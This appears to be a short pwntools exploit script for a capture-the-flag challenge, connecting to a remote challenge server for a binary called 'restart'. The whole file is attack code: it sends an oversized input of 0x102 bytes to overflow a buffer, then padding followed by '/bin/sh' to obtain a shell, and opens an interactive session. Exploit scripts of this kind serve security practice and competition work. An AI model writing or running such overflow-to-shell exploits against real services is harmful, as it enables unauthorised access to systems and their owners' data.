from pwn import *
context.log_level = "debug"

#r=process("./restart")
r=remote("pwn.sixstars.team", 22026)

r.recv()
r.sendline("lee")
r.recv()
r.sendline('a'*0x102)

r.recv()
r.sendline('a'*8+"/bin/sh\x00")

r.interactive()
